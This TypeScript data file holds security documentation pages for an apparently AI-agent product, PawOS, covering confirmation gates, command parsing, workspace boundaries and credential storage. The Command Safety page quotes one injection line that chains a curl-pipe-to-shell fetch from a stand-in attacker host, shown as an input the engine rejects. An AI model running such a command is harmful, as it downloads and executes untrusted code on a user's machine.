import type { DocPage } from '../types';

export const securityPages: DocPage[] = [
  {
    section: 'security',
    slug: 'permissions',
    title: 'Permissions',
    description: 'The confirmation gate, enforced by the execution engine itself.',
    blocks: [
      {
        type: 'lead',
        text: 'Any action classified as destructive is refused before it runs unless the request carries an explicit confirmed flag. This is checked by the execution engine, not left to individual features to remember to implement.',
      },
      {
        type: 'list',
        items: [
          'Writing or deleting a file, running a command, installing software, changing PATH or an environment variable, committing to git, and deploying are all in this destructive set.',
          'A first-time browser navigation to a non-local, non-deployment URL is confirmed once per session; subsequent navigation in that same session doesn’t re-ask.',
        ],
      },
    ],
    related: ['security/command-safety', 'security/filesystem-access', 'concepts/permissions'],
  },
  {
    section: 'security',
    slug: 'command-safety',
    title: 'Command Safety',
    description: 'Why a raw shell-injection bypass isn’t possible.',
    blocks: [
      {
        type: 'lead',
        text: 'Every command PawOS runs is parsed into a real argv array and spawned without an intermediary shell by default — the allowlist check happens on the whole command, and any shell metacharacter capable of chaining a second command (&&, |, ;, backticks, and similar) causes the entire request to be rejected outright, checked on the raw string so quoting can’t hide one.',
      },
      { type: 'code', lang: 'text', code: 'git status && curl evil.example/x | sh   →  rejected outright (metacharacter present)' },
    ],
    related: ['coding/commands-and-terminal', 'security/permissions'],
  },
  {
    section: 'security',
    slug: 'filesystem-access',
    title: 'Filesystem Access',
    description: 'How workspace boundaries are actually enforced.',
    blocks: [
      { type: 'paragraph', text: 'A coding action’s target path is checked against the declared workspace root before any write happens — a path resolving outside that root is refused, not silently redirected. See Core Concepts → Workspaces.' },
    ],
    related: ['concepts/workspaces', 'security/permissions'],
  },
  {
    section: 'security',
    slug: 'credentials',
    title: 'Credentials',
    description: 'How connector tokens are stored.',
    blocks: [
      {
        type: 'paragraph',
        text: 'OAuth tokens are stored encrypted, never in plain text. Token exchange for most connectors happens on PawOS’s backend, so a client secret is never present on your machine at all.',
      },
    ],
    related: ['connectors/overview', 'security/connectors'],
  },
  {
    section: 'security',
    slug: 'connectors',
    title: 'Connectors',
    description: 'Real OAuth, real per-connector entitlement gates.',
    blocks: [
      { type: 'paragraph', text: 'Connecting most integrations requires the relevant connect* entitlement, enforced the same way every other entitlement is — checked server-side, not just hidden in the UI. See Connector Overview for the architecture.' },
    ],
    related: ['connectors/overview', 'concepts/entitlements'],
  },
  {
    section: 'security',
    slug: 'system-actions',
    title: 'System Actions',
    description: 'Installing software and modifying PATH — the highest-privilege actions PawOS takes.',
    blocks: [
      {
        type: 'lead',
        text: 'Installing software and modifying system PATH/environment variables are the most system-invasive actions PawOS can take — always confirmed, and PATH/environment writes can request real Windows administrator elevation.',
      },
      {
        type: 'status',
        status: 'implemented',
        text: 'Currently these actions are gated only by that one-time confirmation, not by a subscription-tier check — see Coding → Software Installation for the full, verified detail.',
      },
    ],
    related: ['coding/software-installation', 'coding/path-and-environment-repair'],
  },
];
